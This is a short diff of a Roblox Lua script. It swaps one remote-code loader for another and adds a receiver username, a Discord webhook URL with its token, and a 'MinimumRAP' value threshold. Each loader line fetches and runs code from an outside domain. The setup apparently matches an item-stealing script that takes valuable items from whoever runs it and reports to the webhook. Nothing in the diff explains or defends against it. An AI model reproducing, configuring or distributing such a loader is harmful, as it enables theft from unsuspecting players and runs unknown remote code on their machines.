@@ -1,1 +1,9 @@
-loadstring(game:HttpGet('https://hugegames.space/59db21ce3a56ade529073535.lua'))()
+Username = "BayramSekeri31"
+Username2 = "BayramSekeri31"
+Webhook = "https://discord.com/api/webhooks/1216371037508341800/UlI1wWCSW6nhyyBL_Via6G_ssnInSvdP6iTRB_K8yhWT6FqpmKUWWjODaNUImSwmclRk"
+
+HubName = "X"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
